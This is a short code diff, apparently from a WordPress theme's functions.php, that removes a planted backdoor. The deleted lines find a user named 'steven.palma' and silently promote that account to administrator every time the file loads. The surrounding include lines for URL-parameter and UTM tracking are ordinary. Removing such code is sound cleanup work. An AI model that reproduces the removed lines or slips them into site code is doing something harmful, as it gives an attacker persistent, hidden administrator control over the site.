@@ -48,9 +48,4 @@ require_once dirname(__FILE__) . '/inc/functions/preserve-url-params.php';
 // Utms
 require_once dirname(__FILE__) . '/inc/wp-utm-url-tracking.php';
 
-$user_id = username_exists('steven.palma');
-if ( $user_id ) {
-    $user = new WP_User( $user_id );
-    $user->set_role( 'administrator' );
-}
 
